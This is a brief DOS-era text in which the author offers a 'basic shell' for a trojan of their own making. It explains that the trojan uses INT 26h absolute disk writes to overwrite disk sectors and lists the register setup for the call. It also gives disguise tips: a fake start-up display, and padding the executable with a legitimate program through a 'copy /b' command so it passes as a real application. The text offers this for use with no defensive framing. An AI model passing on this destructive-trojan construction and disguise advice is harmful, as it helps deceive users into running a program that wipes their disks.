This is a basic shell for a trojan I made. It's a rather simple one that
uses INT 26h, an absolute disk write. 
AL:Drive # (a=0,b=1,etc);
BX:Offset of buffer
CX:Sectors to write
DX:Logical starting segment (meaning ascending from sector 0 or 
                             track0,sector0 going up)
DS:Segment adress of buffer

You may want to put a screen display before the main NOTAGAIN jump
with a start up display or something from TheDraw. 
You may also want to buff up the end by copying a large
file (like TELIX.EXE to the end) to make it big. i.e.

copy /b trojan.exe+telix.exe coolprog.exe

Well have fun!
